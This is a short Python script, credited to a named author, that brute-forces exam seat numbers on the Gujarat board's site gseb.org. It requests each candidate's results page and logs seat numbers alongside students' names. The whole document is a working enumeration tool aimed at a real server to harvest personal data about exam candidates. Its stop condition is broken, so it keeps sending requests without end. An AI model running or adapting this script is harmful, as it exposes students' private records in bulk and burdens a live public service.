# Brute-force seat no. for SSC on gseb.org
# by: Abhishek Padariya

import requests, re

def get(char, num):
    s = char + num[0:2] + '/' + num[2:4] + '/' + char + num + '.html'
    r = requests.get('http://www.gseb.org/285soipmahc/ssc/' + s)

    # print(r.status_code, r.headers, r.text)

    if(r.status_code == 200):
        name = re.findall("Name: <\/b>.*<\/span>",r.text)[0][10:][:-7].encode("utf8")
        
        with open('log.txt', 'a') as f:
            f.write(char + num + ', ' + name + '\n')

    return r.status_code
    

if __name__ == "__main__":
    char = 'C'
    # num = '9174870'

    for i in range(91,100):
        for j in range(74,100):
            flag = 0
            for k in range(1,1000):
                num = str(i).zfill(2) + str(j).zfill(2) + str(k).zfill(3)
                print(num)
                st = get(char, num)

                if st != 200:
                    if flag == 1:
                        break
                    flag = 1
                
                flag = 0
